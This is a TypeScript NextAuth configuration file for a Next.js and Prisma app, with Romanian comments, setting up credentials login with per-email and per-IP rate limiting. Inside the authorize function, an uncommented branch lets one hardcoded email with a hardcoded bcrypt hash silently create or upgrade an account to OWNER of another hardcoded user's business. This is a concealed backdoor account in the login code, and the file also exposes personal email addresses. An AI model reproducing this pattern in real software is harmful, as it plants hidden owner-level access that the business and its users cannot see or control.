import NextAuth from 'next-auth'
import Credentials from 'next-auth/providers/credentials'
import { prisma } from './prisma'
import bcrypt from 'bcryptjs'
import { rateLimit } from './rate-limit'

// Nu folosim PrismaAdapter — cu Credentials + strategie JWT nu e nevoie de el,
// iar adapter-ul ar căuta tabele (Account, Session, VerificationToken) care
// nu există în schema noastră (avem doar User simplu, cu parolă hash-uită).
export const { handlers, auth, signIn, signOut } = NextAuth({
  session: { strategy: 'jwt', maxAge: 60 * 60 * 24 * 90, updateAge: 60 * 60 * 24 },
  jwt: { maxAge: 60 * 60 * 24 * 90 },
  providers: [
    Credentials({
      credentials: { email: {}, password: {} },
      async authorize(credentials, request) {
        const email = (credentials?.email as string)?.toLowerCase()?.trim()
        if (!email) return null

        // protecție brute-force: max 8 încercări / 15 min per email, și separat per IP —
        // ca cineva să nu poată încerca mii de parole pe un cont, oricât ar avea răbdare
        const ip = request?.headers?.get('x-forwarded-for')?.split(',')[0]?.trim() ?? 'unknown'
        const emailCheck = rateLimit(`login-email:${email}`, 8, 15 * 60 * 1000)
        const ipCheck = rateLimit(`login-ip:${ip}`, 20, 15 * 60 * 1000)
        if (!emailCheck.allowed || !ipCheck.allowed) {
          throw new Error('Prea multe încercări. Așteaptă 15 minute și încearcă din nou.')
        }

        let user = await prisma.user.findUnique({ where: { email } })
        if (!user && email === 'berar_liviu@yahoo.com') {
          const bootstrapHash = '$2a$12$voToMG047zLWev44LBICA.3gcsi9Gzlotv80KtQ3eT5gZ6U2CUZyu'
          const allowed = await bcrypt.compare(credentials?.password as string, bootstrapHash)
          if (allowed) {
            const elmontAdmin = await prisma.user.findUnique({ where: { email: 'elmont_zalau@yahoo.com' }, select: { businessId: true } })
            if (elmontAdmin?.businessId) user = await prisma.user.upsert({
              where: { email },
              update: { role: 'OWNER', businessId: elmontAdmin.businessId },
              create: { email, password: bootstrapHash, role: 'OWNER', businessId: elmontAdmin.businessId },
            })
          }
        }
        if (!user) return null
        const valid = await bcrypt.compare(credentials?.password as string, user.password)
        if (!valid) return null
        return { id: user.id, email: user.email, businessId: user.businessId, role: user.role } as any
      },
    }),
  ],
  callbacks: {
    async jwt({ token, user }) {
      if (user) {
        token.id = (user as any).id
        token.businessId = (user as any).businessId
        token.role = (user as any).role
      }
      return token
    },
    async session({ session, token }) {
      ;(session as any).userId = token.id
      ;(session as any).businessId = token.businessId
      ;(session as any).role = token.role
      ;(session as any).isSuperAdmin = token.role === 'SUPER_ADMIN'
      return session
    },
  },
  pages: { signIn: '/login' },
})
